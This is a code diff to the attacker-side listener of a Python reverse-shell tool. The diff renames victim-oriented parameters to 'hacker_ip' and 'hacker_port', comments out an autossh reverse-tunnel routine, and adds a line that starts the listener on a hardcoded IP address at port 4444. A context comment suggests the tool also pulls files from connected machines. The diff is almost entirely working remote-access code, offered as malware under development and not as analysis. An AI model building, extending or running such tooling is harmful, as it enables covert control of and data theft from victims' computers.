@@ -5,19 +5,19 @@
 import socket, json, base64, subprocess, sys, time
 
 class Listener:
-    def setup_reverse_ssh_tunnel():
-        command = ["autossh", "f", "-N", "-R", "6000:localhost:5000", "user@"+cloud_server_ip]
-        while True:
-            try:
-                subprocess.Popen(command)
-                print("Reverse SSH tunnel established.")
-            except Exception as e:
-                print(f"Error establishing reverse SSH tunnel: {e}")
+    # def setup_reverse_ssh_tunnel():
+    #     command = ["autossh", "f", "-N", "-R", "6000:localhost:5000", "user@"+cloud_server_ip]
+    #     while True:
+    #         try:
+    #             subprocess.Popen(command)
+    #             print("Reverse SSH tunnel established.")
+    #         except Exception as e:
+    #             print(f"Error establishing reverse SSH tunnel: {e}")
 
-    def __init__(self, vic_ip, vic_port):
+    def __init__(self, hacker_ip, hacker_port):
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        listener.bind((vic_ip, vic_port))
+        listener.bind((hacker_ip, hacker_port))
         listener.listen(0)
         print("[+] Waiting for incoming connections")
         self.connection, address = listener.accept()
@@ -79,5 +79,8 @@ class Listener:
 
             print(result) #returns "[+] Download successful."
 
+my_listener = Listener("172.172.186.182", 4444)
+my_listener.run()
 
-cloud_server_ip = input("Enter the public IP address of the server running your SSH reverse tunnel: ")
+
+# cloud_server_ip = input("Enter the public IP address of the server running your SSH reverse tunnel: ")
